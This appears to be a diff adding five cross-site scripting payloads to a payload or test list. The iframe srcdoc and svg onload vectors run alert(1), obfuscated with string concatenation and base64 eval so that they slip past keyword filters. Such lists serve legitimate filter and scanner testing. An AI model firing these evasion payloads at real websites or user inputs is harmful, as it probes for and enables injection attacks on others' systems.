@@ -1,0 +1,5 @@
+<iframe srcdoc="<script>window['al'+'ert'](1)</script>">
+<svg onload=window['al'+'ert'](1)>
+<iframe srcdoc="<script>window['al'+'ert'](1)</script>">
+<svg onload=eval(atob('YWxlcnQoMSk='))>
+<iframe srcdoc="<script>eval(atob('YWxlcnQoMSk='))</script>">
